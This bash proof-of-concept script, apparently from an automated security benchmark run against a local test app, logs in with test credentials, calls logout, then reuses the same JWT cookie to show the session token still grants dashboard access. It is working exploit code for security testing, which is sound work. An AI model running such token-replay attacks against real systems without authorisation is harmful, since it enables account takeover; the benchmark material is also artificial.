#!/bin/bash
# POC: Demonstrates that JWT tokens are not invalidated after logout and can still be used to access protected resources
# Target: ./repo
# Created: 2025-11-04T20:13:43.609Z
# Session: benchmark-XBEN-027-24-mhkzunic

# JWT Tokens Not Invalidated After Logout - POC
# This script demonstrates that JWT tokens remain valid after logout

TARGET_HOST="${1:-localhost:8080}"
TARGET_URL="http://${TARGET_HOST}"

echo "[*] JWT Logout Invalidation POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login and get JWT token
echo "[+] Step 1: Authenticating with test:test credentials..."
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

# Perform login and save cookies to jar
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_JAR" -X POST "${TARGET_URL}/password/test" \
  -d "username=test&user_id=10032&password=test")

# Extract auth_token from cookie jar
AUTH_TOKEN=$(grep -oP 'auth_token\s+[A-Za-z0-9_.=-]+' "$COOKIE_JAR" | awk '{print $2}' | head -1)

if [ -z "$AUTH_TOKEN" ]; then
  echo "[-] Failed to obtain auth token"
  echo "[-] Cookie jar contents:"
  cat "$COOKIE_JAR"
  exit 1
fi

echo "[+] Successfully obtained auth token: ${AUTH_TOKEN:0:30}..."
echo ""

# Step 2: Use token to access protected resource (before logout)
echo "[+] Step 2: Using token to access /dashboard (before logout)..."
DASHBOARD_BEFORE=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "$COOKIE_JAR" \
  "${TARGET_URL}/dashboard")

echo "[+] Response code before logout: HTTP $DASHBOARD_BEFORE"
if [ "$DASHBOARD_BEFORE" == "302" ] || [ "$DASHBOARD_BEFORE" == "200" ]; then
  echo "[+] Token is VALID before logout (can access protected resource)"
else
  echo "[-] Unexpected response code before logout: $DASHBOARD_BEFORE"
fi
echo ""

# Step 3: Logout using the token
echo "[+] Step 3: Calling POST /logout to invalidate session..."
LOGOUT_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -b "$COOKIE_JAR" \
  "${TARGET_URL}/logout")

echo "[+] Logout response code: HTTP $LOGOUT_RESPONSE"
echo "[+] User has logged out"
echo ""

# Step 4: Try to use the same token after logout
echo "[+] Step 4: Attempting to use the same token AFTER logout..."
DASHBOARD_AFTER=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "$COOKIE_JAR" \
  "${TARGET_URL}/dashboard")

echo "[+] Response code after logout: HTTP $DASHBOARD_AFTER"
echo ""

# Step 5: Analyze results
echo "[+] Step 5: Vulnerability Analysis"
echo "=================================="
if [ "$DASHBOARD_AFTER" == "302" ] || [ "$DASHBOARD_AFTER" == "200" ]; then
  echo "[!] VULNERABLE: Token is still VALID after logout!"
  echo "[!] Expected: HTTP 401 (Unauthorized)"
  echo "[!] Got:      HTTP $DASHBOARD_AFTER"
  echo ""
  echo "[!] Security Impact:"
  echo "    - Token was not revoked on logout"
  echo "    - Old token can still be used to access protected resources"
  echo "    - Combined with missing expiration, token is valid indefinitely"
  echo ""
  echo "[+] Vulnerability confirmed!"
  exit 0
else
  echo "[*] Token appears to be invalidated after logout"
  echo "[*] Expected vulnerable response (302 or 200), Got: HTTP $DASHBOARD_AFTER"
  exit 1
fi